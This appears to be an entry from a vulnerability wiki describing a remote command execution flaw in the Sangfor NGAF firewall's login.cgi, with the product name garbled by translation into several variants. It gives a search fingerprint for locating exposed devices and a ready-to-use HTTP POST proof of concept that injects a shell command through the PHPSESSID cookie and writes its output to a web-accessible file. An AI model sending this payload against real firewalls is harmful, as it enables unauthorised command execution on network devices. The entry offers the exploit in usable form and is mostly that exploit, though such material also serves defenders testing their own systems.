# Deepin Consensus NGAF next-generation firewall login.cgi remote command execution vulnerability

## Vulnerability Description

Deepinfo Next Generation Firewall is a next-generation application firewall designed based on application security needs. 

## Vulnerability Impact

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">Shenxin NGAF next-generation firewall</span>

## Network surveying and mapping

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">"Redirect.php?url=LogInOut.php"</span>

## Vulnerability reappears

Login page

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1697639705479-39cc829b-1edc-4102-9b01-1f5d6c9bac5a-20231108133116891.png)

Verify POC

```plain
POST /cgi-bin/login.cgi HTTP/1.1 
Host: 
Cache-Control: max-age=0 
Content-Type: Application/X-www-Form
y-forwarded-for: 127.0.0.1
Cookie: PHPSESSID=`$(id > /fwlib/sys/virus/webui/svpn_html/3.txt)`;

{"opr":"login", "data":{"user": "watchTowr" , "pwd": "watchTowr" , "vericode": "NSLB" , "privacy_enable": "0"}}
```

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1697639728998-9a5a3f9a-a49d-4e24-b9c6-0c4cf34100ec.png)

```plain
/svpn_html/3.txt
```